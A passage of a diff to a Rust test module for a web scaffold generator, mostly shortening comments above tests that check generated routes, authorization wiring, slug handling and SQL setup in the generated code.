             routes.contains("Ok(autumn_web::Redirect::to(&paths::show(*id)).into_response())"),
             "transition handler must 303-redirect on a legal edge: {routes}"
         );
-        // Error branch: 422 re-render of the detail page, record unchanged.
         assert!(
             routes.contains("autumn_web::reexports::http::StatusCode::UNPROCESSABLE_ENTITY"),
             "transition handler must 422 on an illegal edge: {routes}"
         );
-        // The detail page markup is shared through `show_view`.
         assert!(
             routes.contains("async fn show_view("),
             "must extract a shared show_view helper: {routes}"
         );
-        // The show view renders transition controls fed by the macro const.
         assert!(
             routes.contains("autumn_web::widgets::transition_controls(&paths::transition_status(row.id), \"status\", &row.status, Order::__AUTUMN_SM_STATUS_TRANSITIONS,"),
             "show view must render transition_controls for the state-machine field: {routes}"
         );
-        // The transition endpoint is registered in the paths! module.
         assert!(
             routes.contains("transition_status,"),
             "paths! must register the transition route name: {routes}"
         );
-        // Security (issue #1326 IDOR fix): with record-policy wiring on (the
-        // default for non-`--api` scaffolds), the transition handler threads the
-        // same `State` + `Session` pair as `update` and record-authorizes the
-        // actor against the loaded row with the `"update"` action BEFORE writing,
-        // so a transition cannot bypass the record policy.
+        // #1326: a transition is authorized as `"update"` against the loaded row
+        // before writing, so it cannot bypass the record policy (IDOR).
         assert!(
             routes.contains(
                 "autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,"
@@ -20655,10 +18534,8 @@ async fn main() {
 
     #[test]
     fn scaffold_with_state_machine_no_policy_emits_no_authz_preamble() {
-        // AC5 / IDOR-fix gating: a `--no-policy` scaffold still emits the
-        // transition route, but WITHOUT the authorize preamble — exactly the
-        // pre-fix `id/db/flash/csrf/body` handler. The authz preamble must appear
-        // only in the state-machine transition route AND only when policy is on.
+        // `--no-policy` still emits the transition route, without the authorize
+        // preamble.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -20675,12 +18552,10 @@ async fn main() {
         )
         .unwrap();
         let routes = action_contents(&plan, "src/routes/orders.rs");
-        // The transition route is still generated…
         assert!(
             routes.contains("pub async fn transition_status("),
             "--no-policy state-machine scaffold must still emit the transition handler: {routes}"
         );
-        // …but with no record-policy authorization wiring.
         assert!(
             !routes.contains("authorize::<Order>"),
             "--no-policy transition handler must not wire authorize: {routes}"
@@ -20693,12 +18568,8 @@ async fn main() {
 
     #[test]
     fn scaffold_with_state_machine_mounts_transition_route_in_main() {
-        // P1 (issue #1326): the generated `main.rs` router must actually MOUNT
-        // each state-machine field's `transition_{field}` handler — otherwise the
-        // show page's `transition_controls` form POSTs to an unmounted route and
-        // 404s. The handler being present in the `routes::{plural}` module and in
-        // the name-only `paths!` helper is not enough; it must be in the router's
-        // `routes![…]` set.
+        // #1326: the router must mount `transition_{field}`, or the show page's
+        // `transition_controls` form 404s. Declaring it in `paths!` is not enough.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -20717,7 +18588,6 @@ async fn main() {
             main.contains("routes::orders::transition_status"),
             "main.rs must MOUNT the transition handler, not just declare it in paths!: {main}"
         );
-        // Mounted alongside the standard CRUD handlers.
         assert!(
             main.contains("routes::orders::update") && main.contains("routes::orders::destroy"),
             "standard CRUD handlers must still be mounted: {main}"
@@ -20726,8 +18596,6 @@ async fn main() {
 
     #[test]
     fn scaffold_without_state_machine_mounts_no_transition_route_in_main() {
-        // AC5: a model with no `:states(…)` field mounts exactly the pre-#1326
-        // route set — no `transition_` entry, no `/transitions/` path.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -20751,13 +18619,9 @@ async fn main() {
 
     #[test]
     fn scaffold_state_machine_field_is_transition_only_on_update() {
-        // P2 (issue #1326): a `:states(…)` column is transition-only. It must be
-        // EXCLUDED from the ordinary update surfaces — the edit-form input and the
-        // update handler's `.set((…))` tuple — so a plain `POST /{plural}/{id}/
-        // update` (or a JSON body) cannot set `status=<anything>` and bypass
-        // `transition_status_to` / its guards. It must be KEPT on the create
-        // surface (initial state), the `New{Model}` insert path, and the show
-        // page's transition controls.
+        // #1326: a `:states(…)` column changes only through its transition, so
+        // update cannot set it and bypass the guards. Create still sets the
+        // initial state, and show keeps the transition controls.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -20772,10 +18636,7 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
         let routes = fs::read_to_string(tmp.path().join("src/routes/orders.rs")).unwrap();
 
-        // ── excluded from the ordinary UPDATE path ───────────────────────────
-        // The update handler's `.set((…))` tuple must NOT set the state column
-        // (that form — `orders::status.eq(new.status.clone())` — is the bypass;
-        // the transition route instead sets `orders::status.eq(new_state)`).
+        // ── excluded from the update path ───────────────────────────
         assert!(
             !routes.contains("orders::status.eq(new.status.clone())"),
             "the update `.set((…))` tuple must exclude the state-machine column: {routes}"
@@ -20784,8 +18645,6 @@ async fn main() {
             routes.contains("orders::title.eq(new.title.clone())"),
             "the update `.set((…))` tuple must still set non-state columns: {routes}"
         );
-        // The edit form drops the state input; the shared helper takes the flag
-        // and the edit call passes `true`.
         assert!(
             routes.contains("exclude_state_fields: bool"),
             "the shared form helper must take an exclude_state_fields flag: {routes}"
@@ -20801,15 +18660,14 @@ async fn main() {
             "the EDIT form call must exclude the state field (pass `true`): {routes}"
         );
 
-        // ── kept on the CREATE path + New{Model} insert ──────────────────────
+        // ── kept on the create path ──────────────────────
         assert!(
             routes.contains(
                 "order_form_for(&changeset, paths::create(), \"Create\", csrf.as_ref(), csrf_field.as_ref(), submit_token.as_ref(), submit_field.as_ref(), false)"
             ),
             "the CREATE form call must keep the state field (pass `false`): {routes}"
         );
-        // `OrderForm` keeps the column (serde-defaulted so an update submit that
-        // omits it still decodes) and `into_new` seeds the initial state.
+        // Serde-defaulted so an update submit without the column still decodes.
         assert!(
             routes.contains("#[serde(default)]\n    pub status: String,"),
             "OrderForm must keep a serde-defaulted state column: {routes}"
@@ -20819,7 +18677,7 @@ async fn main() {
             "into_new must seed the initial state on create: {routes}"
         );
 
-        // ── kept on the SHOW page's transition controls ──────────────────────
+        // ── kept on the show page ──────────────────────
         assert!(
             routes.contains("transition_controls(&paths::transition_status(row.id), \"status\""),
             "the show view must still render the state column's transition controls: {routes}"
@@ -20828,8 +18686,6 @@ async fn main() {
 
     #[test]
     fn scaffold_without_state_machine_keeps_field_on_update_surfaces() {
-        // AC5: a no-state-machine model's update form/handler are unchanged — no
-        // exclude flag, every field set on the update path.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -20854,10 +18710,8 @@ async fn main() {
 
     #[test]
     fn smoke_test_default_value_containing_semicolon_does_not_corrupt_sql() {
-        // Regression test (PR review, issue #1023): `create_table_sql_with_metadata_and_id`
-        // emits `DEFAULT '...'` verbatim for a String/Text `--default`, so a
-        // value containing a semicolon (e.g. a bio with "; " in it) must not
-        // be split into two broken `db.execute_sql(...)` calls.
+        // #1023: a String `--default` is emitted verbatim as `DEFAULT '...'`, so a
+        // `;` inside it must not split the SQL into two `execute_sql` calls.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -20880,10 +18734,6 @@ async fn main() {
             test.contains("DEFAULT 'hello;world'"),
             "generated default literal must survive intact: {test}"
         );
-        // Every db.execute_sql(...) call's string literal argument must itself
-        // be balanced/complete SQL -- i.e. the CREATE TABLE statement was not
-        // split mid-literal. Count occurrences of "CREATE TABLE" (must be
-        // exactly one, not spread across two calls).
         assert_eq!(
             test.matches("CREATE TABLE").count(),
             1,
@@ -20924,12 +18774,9 @@ async fn main() {
 
     #[test]
     fn scaffold_enum_rejection_test_uses_idempotent_create_table() {
-        // Regression test: both the base index test and the enum-rejection
-        // test run against the same shared `TestDb` in the same test binary
-        // and both issue a `CREATE TABLE posts (...)` as part of setup —
-        // without `IF NOT EXISTS` on (at least) one of them, whichever test
-        // runs second fails with "relation \"posts\" already exists" instead
-        // of reaching its actual assertions.
+        // Both generated tests share one `TestDb` and create `posts`, so the
+        // second to run would fail with "relation already exists" without
+        // `IF NOT EXISTS`.
         let tmp = project_with_main(default_main());
         plan_and_execute_post_scaffold_with_status_enum(&tmp);
         let test = fs::read_to_string(tmp.path().join("tests/post.rs")).unwrap();
@@ -20954,11 +18801,8 @@ async fn main() {
 
     #[test]
     fn scaffold_enum_rejection_test_uses_idempotent_create_index() {
-        // Regression test: `setup_calls` also contains `CREATE INDEX` for any
-        // `--index`/`references` field, not just the `CREATE TABLE` — the
-        // enum-rejection test's own copy of that index statement needs the
-        // same `IF NOT EXISTS` treatment, or it panics with "relation
-        // \"idx_posts_title\" already exists" when it runs after the base test.
+        // Setup also emits `CREATE INDEX` for an indexed field; the enum-rejection
+        // test's copy needs `IF NOT EXISTS` too, or it fails after the base test.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -21053,12 +18897,8 @@ async fn main() {
 
     #[test]
     fn scaffold_validation_smoke_test_max_only_rule_exceeds_bound() {
-        // Regression guard: a fixed-size "invalid" literal (e.g. 1000 `x`s)
-        // would itself satisfy a looser `max` bound like 2000, silently
-        // turning the smoke test's "invalid" submission valid and failing its
-        // own `.assert_status(422)` premise. The generated invalid value must
-        // scale with the declared `max` (here, more than 5 characters), and
-        // the generated valid value must stay within it (at most 5).
+        // A fixed-size invalid literal could satisfy a loose `max`, so the
+        // samples scale with the declared bound.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -21108,12 +18948,8 @@ async fn main() {
 
     #[test]
     fn scaffold_validation_smoke_test_skips_absurdly_large_bound() {
-        // Regression guard (issue #1124 review): a declared bound like
-        // `length:min=1000000000` has no cheap, correct sample to generate —
-        // capping the sample length would either fail to violate a huge `max`
-        // or fail to satisfy a huge `min`, asserting something false. The
-        // generator must skip emitting this smoke test entirely rather than
-        // allocating a multi-GB string in the CLI process itself.
+        // A huge bound has no cheap correct sample: a capped one would assert
+        // something false, an exact one is a multi-GB string. Skip the test.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -21140,11 +18976,8 @@ async fn main() {
 
     #[test]
     fn scaffold_validation_smoke_test_skips_noop_min_zero_rule() {
-        // Regression guard (issue #1124 review): `length:min=0` with no `max`
-        // is a no-op — every string, including blank, already satisfies it.
-        // Emitting a smoke test that submits a value and asserts 422 anyway
-        // would fail against the real server. The generator must skip the
-        // test entirely when this is the only validated field.
+        // `length:min=0` with no `max` accepts every string, including blank, so a smoke test that
+        // expects 422 would fail against the real server (#1124).
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -21171,9 +19004,6 @@ async fn main() {
 
     #[test]
     fn scaffold_validation_smoke_test_falls_back_past_noop_rule() {
-        // When one validated field's rule is a no-op (`length:min=0`) but
-        // another has a genuinely violatable rule, the smoke test must be
-        // built around the violatable field instead of skipping entirely.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -21207,11 +19037,8 @@ async fn main() {
 
     #[test]
     fn scaffold_validation_rejects_min_greater_than_max() {
-        // Regression guard (issue #1124 review): `length:min=5,max=3` is a
-        // self-contradictory rule no string can ever satisfy — accepting it
-        // would generate a field that's permanently invalid and a smoke test
-        // whose "valid submission" assertion is always false. It must be
-        // rejected at generate-time instead.
+        // No string satisfies `length:min=5,max=3`, so the field would be permanently invalid
+        // (#1124).
         let tmp = project_with_main(default_main());
         let err = plan_scaffold_with_options(
             tmp.path(),
@@ -21235,10 +19062,8 @@ async fn main() {
 
     #[test]
     fn scaffold_multiple_enum_fields_each_use_own_variant_as_other_columns_sample() {
-        // A second required enum column's raw-INSERT sample value must be one
-        // of *its own* variants, not the generic `'sample'` placeholder —
-        // otherwise it would trip its own CHECK too and the test would no
-        // longer isolate the failure to the column actually under test.
+        // The other enum column's sample must be one of its own variants, or it trips its own CHECK
+        // and the INSERT no longer isolates the column under test.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -21269,10 +19094,8 @@ async fn main() {
 
     #[test]
     fn scaffold_enum_rejection_test_isolates_check_failure_from_required_references_field() {
-        // Regression test: a required `references` field co-occurring with
-        // the enum field under test must not make the raw out-of-set INSERT
-        // fail for the wrong reason (an FK violation on a dangling stub-table
-        // reference) instead of the CHECK constraint actually being tested.
+        // The required `references` column must not fail the out-of-set INSERT with an FK violation
+        // before the CHECK under test fires.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -21338,10 +19161,8 @@ async fn main() {
             "20260427000000",
         )
         .unwrap();
-        // Two warnings: the shared "assuming table exists" one from
-        // `check_reference_targets`, plus the scaffold-specific note that the
-        // form falls back to a numeric id input (no schema entry to load
-        // select options from) and how to get the select instead.
+        // `check_reference_targets`'s "assuming table exists" warning, plus the scaffold's note
+        // that the form falls back to a numeric id input.
         assert_eq!(plan.warnings.len(), 2, "warnings: {:?}", plan.warnings);
         assert!(plan.warnings[0].contains("posts"));
         assert!(
@@ -21384,9 +19205,8 @@ async fn main() {
 
     #[test]
     fn scaffold_slug_field_adds_find_by_slug_to_repository_for_free() {
-        // A slug is implicitly `unique` (dsl.rs), so this falls into the
-        // existing issue #1032 "every unique field gets a `find_by_<field>`"
-        // machinery with zero new repository codegen.
+        // A slug is implicitly `unique`, so it gets the `find_by_<field>` every unique field gets
+        // (#1032).
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -21438,12 +19258,8 @@ async fn main() {
             routes.contains("posts::table\n        .filter(posts::slug.eq(&__route_key))"),
             "{routes}"
         );
-        // AC6, falsifiable check: zero `/{id}`-keyed HTML route ATTRIBUTES remain
-        // for a slug-bearing model (doc comments legitimately still mention the
-        // still-id-keyed JSON REST API, e.g. `PUT /api/posts/{id}` — that's the
-        // auto-generated `#[repository]` surface, out of scope here, so this
-        // checks the `#[get(...)]`/`#[post(...)]` attributes specifically, not
-        // the whole file).
+        // No HTML route attribute is keyed on `/{id}`. Doc comments still mention the id-keyed JSON
+        // API (`PUT /api/posts/{id}`), so check the attributes, not the whole file.
         assert!(!routes.contains(r#"#[get("/posts/{id}"#), "{routes}");
         assert!(!routes.contains(r#"#[post("/posts/{id}"#), "{routes}");
         assert!(!routes.contains("Path<i64>"), "{routes}");
@@ -21501,11 +19317,8 @@ async fn main() {
 
     #[test]
     fn scaffold_slug_field_update_also_auto_derives_when_blank() {
-        // AC4's blank-derives-a-slug behavior isn't create-only: the form
-        // exposes the slug as a plain optional input on BOTH create and
-        // edit, so clearing it on edit must re-derive too, or the record's
-        // NOT NULL column ends up literally "" and its own `/{slug}` route
-        // becomes unreachable (issue #1260 review finding).
+        // The slug input is optional on edit too, so clearing it must re-derive; otherwise the NOT
+        // NULL column stores "" and the record's `/{slug}` route is unreachable.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -21517,17 +19330,13 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // Both the `create` AND `update` handlers get a derive block — assert
-        // it appears twice, not just once (i.e. not only on create).
         assert_eq!(
             routes.matches("if new.slug.is_empty() {").count(),
             2,
             "expected a derive block in both create and update: {routes}"
         );
-        // The update path's collision probe excludes the record's own
-        // current row (identified by the path extractor's old value),
-        // otherwise a no-op re-derivation of an unchanged title would
-        // spuriously collide with itself.
+        // The update probe excludes the record's own row, or re-deriving an unchanged title would
+        // collide with itself.
         assert!(
             routes.contains(
                 "posts::table\n                .filter(posts::slug.eq(&candidate))\n                \
@@ -21539,10 +19348,7 @@ async fn main() {
 
     #[test]
     fn scaffold_slug_field_update_redirects_to_the_persisted_slug_not_the_stale_path_value() {
-        // If the user changes (or blanks and re-derives) the slug on edit,
-        // the success redirect must resolve the JUST-PERSISTED value —
-        // redirecting to the old path-extractor value 404s (issue #1260
-        // review finding).
+        // Redirect to the slug just saved: the old path value 404s once the slug changes.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -21565,13 +19371,9 @@ async fn main() {
 
     #[test]
     fn scaffold_slug_field_named_like_an_extractor_param_does_not_collide() {
-        // Review finding: a slug field literally named `db` (a valid
-        // `snake_case` declaration, `db:slug{from:title}`) previously
-        // destructured straight to `Path(db): Path<String>`, colliding with
-        // the SAME handler's own `mut db: Db` extractor parameter — a
-        // duplicate-binding compile error. `flash`/`body`/`csrf`/`session`
-        // are the same class of bug. The extractor must bind to a fixed
-        // internal name regardless of the field's actual name.
+        // A slug field named `db` (or `flash`, `body`, `csrf`, `session`) must not bind `Path(db)`,
+        // which clashes with the handler's own `mut db: Db`. The extractor binds a fixed internal
+        // name.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -21583,7 +19385,6 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // The extractor's local binding is the fixed internal name, not `db`.
         assert!(
             routes.contains("Path(__route_key): Path<String>"),
             "{routes}"
@@ -21595,11 +19396,8 @@ async fn main() {
             routes.contains("posts::table\n        .filter(posts::db.eq(&__route_key))"),
             "{routes}"
         );
-        // No handler signature now declares `db` twice (once as the route-key
-        // extractor, once as `mut db: Db`) — every `show`/`edit`/`update`/
-        // `destroy` still gets exactly one `db: Db`/`mut db: Db` parameter.
-        // Scan the parameter list between `fn <handler>(` and the matching
-        // `{` that opens the function body.
+        // Each handler declares exactly one `db` parameter. Scan the parameter list between
+        // `fn <handler>(` and the `{` that opens the body.
         for handler in ["fn show(", "fn edit_form(", "fn update(", "fn destroy("] {
             let start = routes.find(handler).unwrap_or_else(|| {
                 panic!("missing handler {handler} in generated routes: {routes}")
@@ -21618,10 +19416,8 @@ async fn main() {
 
     #[test]
     fn scaffold_slug_field_collision_loop_never_settles_on_the_reserved_new_segment() {
-        // `GET /{plural}/new` is a static route; axum's router always prefers
-        // it over the `GET /{plural}/{slug}` capture, so a record whose slug
-        // were literally "new" would be permanently unreachable at its own
-        // show page. The derive loop must keep probing past it.
+        // `GET /{plural}/new` is a static route that axum prefers over the `/{slug}` capture, so a
+        // record whose slug is "new" would be unreachable. The derive loop must probe past it.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -21641,10 +19437,8 @@ async fn main() {
 
     #[test]
     fn scaffold_slug_field_collision_loop_also_reserves_search_when_searchable() {
-        // `--searchable` emits a second static sibling route, `GET
-        // /{plural}/search`, which the router would likewise prefer over
-        // `GET /{plural}/{slug}` for a record whose derived slug were
-        // literally "search".
+        // `--searchable` adds the static `GET /{plural}/search`, which likewise shadows a slug of
+        // "search".
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -21671,12 +19465,9 @@ async fn main() {
 
     #[test]
     fn scaffold_slug_field_form_input_is_not_required() {
-        // AC4's auto-derive-on-blank only ever runs if a blank submission can
-        // reach the server: a plain HTML5 `required` attribute on the slug
-        // input would have the browser block submission first. The DB column
-        // stays `NOT NULL` (AC3); only the form control must render as
-        // optional (the issue's own words: "the generated form may expose it
-        // as a plain optional text input").
+        // Auto-derive on blank only runs if a blank submission reaches the server; an HTML5
+        // `required` on the slug input would block it in the browser. Only the column is
+        // `NOT NULL`.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -21697,9 +19488,7 @@ async fn main() {
             routes.contains("autumn_web::a11y::TextField::new(\"slug\")"),
             "{routes}"
         );
-        // The appended slug control must never carry `.required()` — grab the
-        // slice from its `TextField::new` call up to the next field's block
-        // (or the appends' end) and check `.required()` doesn't appear in it.
+        // The slug control runs from its `TextField::new` call to the next `}})`.
         let start = routes
             .find("autumn_web::a11y::TextField::new(\"slug\")")
             .expect("slug TextField control");
@@ -21837,9 +19626,8 @@ async fn main() {
 
     #[test]
     fn scaffold_slug_from_defaulted_field_is_rejected() {
-        // A `--default` column is dropped from the generated `New{Pascal}`
-        // insert struct entirely (issue #1260 review finding), so the create
-        // handler's `new.{from}` read would not compile.
+        // A `--default` column is dropped from `New{Pascal}`, so the create handler's `new.{from}`
+        // read would not compile.
         let tmp = project_with_main(default_main());
         let err = plan_scaffold_with_options(
             tmp.path(),
@@ -21864,13 +19652,9 @@ async fn main() {
 
     #[test]
     fn scaffold_smoke_test_creates_a_stub_referenced_table_before_the_real_one() {
-        // The generated smoke test runs in its own throwaway `TestDb` (one
-        // Postgres testcontainer per `tests/*.rs` binary, per-process — see
-        // `TestDb::shared()`), so it can't rely on some *other* scaffolded
-        // resource's smoke test having already created the referenced table.
-        // A `CREATE TABLE comments (... REFERENCES posts(id) ...)` would fail
-        // with "relation posts does not exist" unless the comments smoke test
-        // creates a minimal stand-in `posts` table itself first.
+        // Each generated test binary gets its own `TestDb`, so it cannot rely on another resource's
+        // test having created the referenced table. `REFERENCES posts(id)` needs a stub `posts`
+        // first.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -21913,11 +19697,8 @@ async fn main() {
 
     #[test]
     fn render_reference_stub_tables_sql_dedupes_identical_targets() {
-        // Two references that resolve to the same target table must only
-        // emit one `CREATE TABLE IF NOT EXISTS` for it. Constructed directly
-        // (bypassing `parse_fields`, which enforces unique column names) so
-        // the collision is deterministic rather than relying on two English
-        // words coincidentally pluralising to the same string.
+        // Two references to the same table emit one `CREATE TABLE IF NOT EXISTS`. Built by hand
+        // because `parse_fields` rejects duplicate column names.
         let fields = vec![
             Field {
                 name: "author_id".to_string(),
@@ -21954,15 +19735,9 @@ async fn main() {
 
     #[test]
     fn render_reference_stub_tables_sql_seeds_a_row_so_fk_id_1_is_valid() {
-        // Regression test: a raw INSERT the smoke test issues against the
-        // table under test (e.g. the enum out-of-set rejection test) uses a
-        // NOT NULL `references` column's sample literal ("1" — see
-        // `sql_sample_literal`); without a seeded row, that INSERT would
-        // fail on the FK constraint regardless of what it's actually trying
-        // to exercise. Two rows are seeded (ids 1 and 2) — the second is for
-        // `unique_sample_literal_variant`'s "1" (target) vs. "2" (a
-        // non-target `unique references` column in the duplicate insert)
-        // distinction; see that function's doc comment.
+        // A raw INSERT against the table under test uses "1" for a NOT NULL `references` column, so
+        // the stub must hold that row or the INSERT fails on the FK. Row 2 is the non-target value
+        // `unique_sample_literal_variant` uses in the duplicate insert.
         let fields = super::super::dsl::parse_fields(&["author:references".into()]).unwrap();
         let sql = render_reference_stub_tables_sql(DatabaseBackend::Postgres, &fields, "posts");
         assert_eq!(
@@ -22013,10 +19788,8 @@ async fn main() {
 
     #[test]
     fn render_reference_stub_tables_sql_skips_own_table() {
-        // A self-referential `references` field (e.g. `Category` with
-        // `category:references`) targets the model's own table, which the
-        // real (non-`IF NOT EXISTS`) `CREATE TABLE` creates right after —
-        // stubbing it first would collide with that statement.
+        // A self-reference targets the model's own table, which the real `CREATE TABLE` creates
+        // right after; a stub would collide with it.
         let fields = super::super::dsl::parse_fields(&["category:references".into()]).unwrap();
         assert_eq!(fields[0].reference_table().as_deref(), Some("categories"));
         let sql =
@@ -22115,11 +19888,8 @@ async fn main() {
 
     #[test]
     fn json_seed_value_varies_per_row_for_unique_columns() {
-        // Issue #1341 review: a constant `'{}'::jsonb` for every row (the
-        // `sql_sample_literal` fallback) would collide on the very first
-        // re-insert for a `unique` json column in the `--api` smoke test's
-        // 25-row (`API_SMOKE_TEST_SEED_ROWS`) seed — must vary with `g`, same
-        // as the text/numeric/timestamp arms.
+        // A constant `'{}'::jsonb` would collide on the second row of the `--api` smoke test's seed
+        // for a `unique` json column, so the value must vary with `g` (#1341).
         let f = csv_test_field("config", FieldKind::Json, false);
         let expr = sql_seed_value_expr(DatabaseBackend::Postgres, &f);
         assert!(
@@ -22138,12 +19908,8 @@ async fn main() {
 
     #[test]
     fn enum_rejection_insert_sql_fits_tightly_scaled_decimal_column() {
-        // Regression test: a `decimal{1,1}` column (valid range `(-1,1)`)
-        // combined with a required enum column used to get a fixed "1.0"
-        // sample literal from `sql_sample_literal`, which Postgres's
-        // `NUMERIC(1,1)` rejects as a numeric field overflow — breaking a
-        // generated test that has nothing to do with the enum behavior it's
-        // meant to exercise.
+        // A fixed "1.0" sample overflows `NUMERIC(1,1)` (range `(-1,1)`) and would fail the enum
+        // test for an unrelated reason.
         let status = Field {
             name: "status".to_string(),
             kind: FieldKind::Enum,
@@ -22283,8 +20049,8 @@ async fn main() {
         )
         .unwrap();
         let routes = action_contents(&plan, "src/routes/posts.rs");
-        // edit / update / destroy carry an inline authorize call, and (issue
-        // #1312) bulk_delete authorizes each selected row before deleting it.
+        // edit/update/destroy authorize inline, and bulk_delete authorizes each selected row
+        // (#1312).
         assert_eq!(
             routes
                 .matches("autumn_web::authorization::authorize::<Post>")
@@ -22295,18 +20061,13 @@ async fn main() {
         assert!(routes.contains("\"edit\", &row"), "{routes}");
         assert!(routes.contains("\"update\", &current"), "{routes}");
         assert!(routes.contains("\"delete\", &current"), "{routes}");
-        // The HTML create handler runs the policy's `can_create` check before
-        // inserting, threading `State`/`Session` like the other mutations.
         assert!(
             routes
                 .contains("autumn_web::authorization::authorize_create::<Post>(&state, &session)"),
             "create must authorize_create: {routes}"
         );
         assert!(routes.contains("pub async fn create("), "{routes}");
-        // Issue #1841: the standard owner-scoped index now applies the owner
-        // scope through the repository's owner-filtered `list_scoped` (which also
-        // brings allowlisted sort/filter), not a hand-rolled diesel query — and
-        // it must NEVER fall back to the unscoped `repo.list`/`repo.page`.
+        // `list_scoped` applies the owner scope plus the allowlisted sort/filter (#1841).
         assert!(
             routes.contains("repo.list_scoped(owner_id, &list_query, &page_req)"),
             "index must scope through list_scoped: {routes}"
@@ -22319,7 +20080,6 @@ async fn main() {
             routes.contains("PolicyContext::from_request(&state, &session)"),
             "{routes}"
         );
-        // The cross-user 403 smoke test is emitted.
         let smoke = action_contents(&plan, "tests/post.rs");
         assert!(
             smoke.contains("cross_user_mutations_are_forbidden"),
@@ -22330,9 +20090,7 @@ async fn main() {
 
     #[test]
     fn live_owner_scaffold_authorizes_mutating_handlers_and_scopes_index() {
-        // Issue #1830: `--live` variants now record-authorize their mutating
-        // handlers and owner-scope the index, loading the current row through the
-        // repository (not raw diesel) while keeping the SSE `<ul>` island.
+        // `--live` gains the same authorization and keeps its SSE `<ul>` island (#1830).
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -22357,7 +20115,6 @@ async fn main() {
         assert!(routes.contains("\"edit\", &row"), "{routes}");
         assert!(routes.contains("\"update\", &current"), "{routes}");
         assert!(routes.contains("\"delete\", &current"), "{routes}");
-        // The row is loaded via the repository extractor, not raw diesel.
         assert!(
             routes.contains("let current: Post = repo.find_by_id(*id).await?"),
             "live variant must load current row via the repository: {routes}"
@@ -22367,7 +20124,6 @@ async fn main() {
                 .contains("autumn_web::authorization::authorize_create::<Post>(&state, &session)"),
             "live create must authorize_create: {routes}"
         );
-        // Index is owner-scoped but keeps the SSE list contract.
         assert!(
             routes.contains("posts::author_id.eq(owner_id)"),
             "live index must filter by owner: {routes}"
@@ -22385,9 +20141,6 @@ async fn main() {
 
     #[test]
     fn sharded_owner_scaffold_authorizes_mutating_handlers_and_scopes_index() {
-        // Issue #1830: `--sharded` variants record-authorize their mutating
-        // handlers and owner-scope the index, loading the current row through a
-        // `from_shard` repository and querying the pinned `ShardedDb` connection.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -22414,7 +20167,6 @@ async fn main() {
         assert!(routes.contains("\"edit\", &row"), "{routes}");
         assert!(routes.contains("\"update\", &current"), "{routes}");
         assert!(routes.contains("\"delete\", &current"), "{routes}");
-        // The row is loaded via `from_shard(&db).find_by_id(...)`.
         assert!(
             routes.contains(
                 "let current: Post = PgPostRepository::from_shard(&db).find_by_id(*id).await?"
@@ -22426,7 +20178,6 @@ async fn main() {
                 .contains("autumn_web::authorization::authorize_create::<Post>(&state, &session)"),
             "sharded create must authorize_create: {routes}"
         );
-        // Owner-scoped index runs on the ShardedDb connection (no bare `Db`).
         assert!(
             routes.contains("posts::author_id.eq(owner_id)"),
             "sharded index must filter by owner: {routes}"
@@ -22439,9 +20190,8 @@ async fn main() {
 
     #[test]
     fn attachment_owner_scaffold_authorizes_reusing_state_wrapper() {
-        // Issue #1830: attachment scaffolds already thread a `state:` wrapper for
-        // the multipart upload, so the authorize wiring reuses it (`&*state`) and
-        // adds only `session` — no duplicate `State(state)` extractor.
+        // Attachment handlers already take a `state` wrapper for the multipart upload;
+        // authorization reuses it (`&*state`) and adds only `session` (#1830).
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -22479,8 +20229,6 @@ async fn main() {
             ),
             "attachment edit must authorize via &state: {routes}"
         );
-        // The create/update handlers must NOT gain a second `State(state)`
-        // extractor — the reused wrapper stays the sole `state` binding.
         assert!(
             !routes.contains(
                 "autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,\n    body: Bytes"
@@ -22489,10 +20237,7 @@ async fn main() {
             ),
             "attachment create/update must not inject a duplicate State extractor: {routes}"
         );
-        // Owner-scoped index still emitted for the attachment path. Issue #1841:
-        // the standard Db owner index now scopes via the repository's
-        // owner-filtered `list_scoped` (with sort/filter) rather than a manual
-        // diesel query — and never falls back to the unscoped list/page.
+        // The attachment index also scopes through `list_scoped` (#1841).
         assert!(
             routes.contains("repo.list_scoped(owner_id, &list_query, &page_req)"),
             "attachment index must scope through list_scoped: {routes}"
@@ -22540,11 +20285,8 @@ async fn main() {
 
     #[test]
